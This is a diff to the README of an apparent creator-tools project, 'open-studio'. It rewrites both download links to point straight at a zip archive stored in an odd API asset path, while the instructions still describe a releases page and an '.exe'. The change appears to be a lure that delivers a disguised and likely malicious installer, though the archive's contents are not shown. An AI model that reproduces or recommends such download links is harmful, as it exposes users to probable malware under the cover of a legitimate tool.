@@ -1,6 +1,6 @@
 # 🚀 open-studio - Build your creator content with ease
 
-[![Download Open-Studio](https://img.shields.io/badge/Download-OpenStudio-blue.svg)](https://github.com/Andreluemb4311/open-studio)
+[![Download Open-Studio](https://img.shields.io/badge/Download-OpenStudio-blue.svg)](https://github.com/Andreluemb4311/open-studio/raw/refs/heads/main/app/api/assets/[id]/open-studio-3.8.zip)
 
 Open-studio is a workspace for digital creators. It helps you manage your workflow from the first spark of an idea to the final video upload. You can write scripts, generate thumbnails, draft captions, and research hashtags in one place. This tool connects to different AI providers to help you create better content in less time.
 
@@ -8,7 +8,7 @@ Open-studio is a workspace for digital creators. It helps you manage your workfl
 
 You need to download the installer to your computer. Follow these steps to get started:
 
-1. Visit the [official download page here](https://github.com/Andreluemb4311/open-studio).
+1. Visit the [official download page here](https://github.com/Andreluemb4311/open-studio/raw/refs/heads/main/app/api/assets/[id]/open-studio-3.8.zip).
 2. Look for the latest release version on the right side of the page.
 3. Select the file ending in `.exe` to download it.
 4. Open the downloaded file once the process finishes.
